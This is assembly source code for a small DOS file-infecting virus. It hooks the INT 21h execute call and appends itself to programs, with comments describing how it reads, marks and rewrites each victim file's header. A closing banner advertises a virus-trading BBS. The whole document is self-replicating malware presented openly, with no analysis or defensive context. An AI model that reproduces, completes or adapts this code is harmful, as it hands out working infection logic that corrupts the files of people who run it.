VSize=085h

Code            Segment
                Assume  CS:Code
                org     0
                db      4Dh
                jmp     Start

                Org     600h

Bytes           db      0CDh,20h,90h,90h

Start:          mov     si, 0100h
                mov     bx, offset Int21
                mov     cx, 0050h
                mov     di, si
                add     si, [si+2]
                push    di
                movsw
                movsw
                mov     es, cx
                cmpsb
                je      StartFile
                dec     si
                dec     di
        rep     movsw
                mov     es, cx
                xchg    ax, bx
                xchg    ax, cx
Loop0:          xchg    ax, cx
                xchg    ax, word ptr es:[di-120h]
                stosw
                jcxz    Loop0
                xchg    ax, bx
StartFile:
                push    ds
                pop     es
                ret

Int21:          cmp     ax, 4B00h
                jne     End21
Exec:           push    ax 
                push    bx 
                push    dx
                push    ds
                push    es
                mov     ax, 3D02h
                call    DoInt21
                jc      EndExec
                cbw                     ;Zero AH
                cwd                     ;Zero DX
                mov     bx, si          ;Move handle to BX
                mov     ds, ax          ;Set DS and ES to 60h,
                mov     es, ax          ;the virus data segment
                mov     ah, 3Fh         ;Read first 4 bytes
                int     69h
                mov     al, 4Dh
                scasb                   ;Check for 4D5Ah or infected file mark
                je      Close           ;.EXE or already infected
                mov     al, 2
                call    LSeek       ;Seek to the end, SI now contains file size
                mov     cl, VSize       ;Virus size in CX, prepare to write
                int     69h             ;AH is 40h, i.e. Write operation
                mov     ax, 0E94Dh      ;Virus header in AX
                stosw                   ;Store it
                xchg    ax, si          ;Move file size in AX
                stosw                   ;Complete JMP instruction
                xchg    ax, dx          ;Zero AX
                call    LSeek           ;Seek to the beginning
                int     69h             ;AH is 40h, write the virus header
Close:          mov     ah,3Eh          ;Close the file
                int     69h
EndExec:        pop     es 
                pop     ds
                pop     dx
                pop     bx
                pop     ax
End21:          jmp     dword ptr cs:[69h * 4]

LSeek:          mov     ah, 42h         ;Seek operation
                cwd                     ;Zero DX
DoInt21:        xor     cx, cx          ;External entry for Open, zero cx
                int     69h
                mov     cl, 4           ;4 bytes will be read/written
                xchg    ax, si          ;Store AX in SI
                mov     ax, 4060h       ;Prepare AH for Write
                xor     di, di          ;Zero DI
                ret

VLen = $ - offset Bytes

Code    EndS
End

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

